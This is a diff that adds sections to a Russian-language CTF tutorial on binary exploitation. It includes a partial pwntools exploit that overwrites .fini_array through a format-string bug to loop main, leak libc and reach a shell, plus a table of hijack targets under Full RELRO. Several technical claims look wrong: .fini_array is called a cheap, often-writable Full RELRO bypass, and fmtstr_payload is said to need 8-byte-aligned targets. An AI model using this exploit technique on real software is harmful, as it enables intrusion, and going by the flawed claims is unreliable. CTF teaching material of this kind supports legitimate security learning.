@@ -179,6 +179,54 @@ $ python3 -c "from pwn import *; e=ELF('./chall'); \
 - Примитивом может быть format string (`fmtstr_payload`) или heap.
 - `.fini_array` — самый дешёвый обход Full RELRO: одна запись 8 байт.
 
+## Полный PoC: цикл → утечка → shell
+
+Соберём эксплойт целиком, как он выглядит в solve-скрипте. Бинарь — Full RELRO, No PIE, format string в `printf(buf)`.
+
+```python
+from pwn import *
+context.binary = elf = ELF('./chall')
+
+def start():
+    return process('./chall')
+
+io = start()
+fini = elf.get_section_by_name('.fini_array').header.sh_addr
+main = elf.symbols['main']
+
+# 1) найти смещение нашего буфера на стеке
+io.sendlineafter(b'Name: ', b'%6$p')      # подбираем N в %N$p
+io.recvuntil(b'0x')
+leak = int(io.recvline().strip(), 16)
+
+# 2) записать main в .fini_array[0] -> цикл по main
+io.sendlineafter(b'Name: ', fmtstr_payload(6, {fini: main}))
+
+# 3) теперь у нас сколько угодно раундов: утекаем libc
+io.sendlineafter(b'Name: ', b'%7$p')      # адрес из libc
+...
+# 4) в следующем раунде пишем .fini_array[0] = one_gadget/win
+```
+
+Ключевые грабли: `fmtstr_payload` пишет **по 8 байт**, поэтому цель должна быть выровнена; если `.fini_array` попадает в RELRO-сегмент — запись молча не пройдёт (проверяйте `readelf -l`). И помните: после перезаписи `.fini_array` на `main` программа **не завершится** — это и есть источник новых раундов.
+
+## Записываемые цели при Full RELRO
+
+| Цель | Когда срабатывает | Цена/условие |
+|---|---|---|
+| `.fini_array` | `exit`/`return` из `main` | 1 запись 8 байт, часто writable |
+| `__exit_funcs` (atexit) | `exit`/`return` | нужен контроль heap-структуры |
+| `tls_dtor_list` | `exit`, thread-local | указатель + heap-фейк |
+| `_IO_list_all` (FSOP) | `exit` → `_IO_cleanup` | vtable-фейк, сложно |
+| `__malloc_hook` | `malloc` | **удалён в glibc ≥ 2.34** |
+| `__free_hook` | `free` | **удалён в glibc ≥ 2.34** |
+
+Порядок предпочтения прост: сначала `.fini_array` (одна запись), затем `__exit_funcs`, затем FSOP. Если на бинаре стоит фильтр `%n` — переходите на heap-примитив (tcache poisoning) и пишите те же цели.
+
+## .init_array и .fini_array: когда какой использовать
+
+`.init_array` вызывает функции **до** `main`, поэтому перезапись её элемента даёт выполнение ещё до основного кода — удобно, если программа быстро завершается или проверяет что-то в `main`. Но есть нюанс: `.init_array` исполняется один раз при старте, до того как у нас появился примитив записи. Поэтому на практике в CTF чаще берут именно `.fini_array` (после `main`, когда утечка/запись уже сделаны) либо комбинируют: `.init_array` в редких задачах с примитивом «до main», `.fini_array` — как основной путь повторного входа.
+
 ## Квиз
 
 Проверь себя.
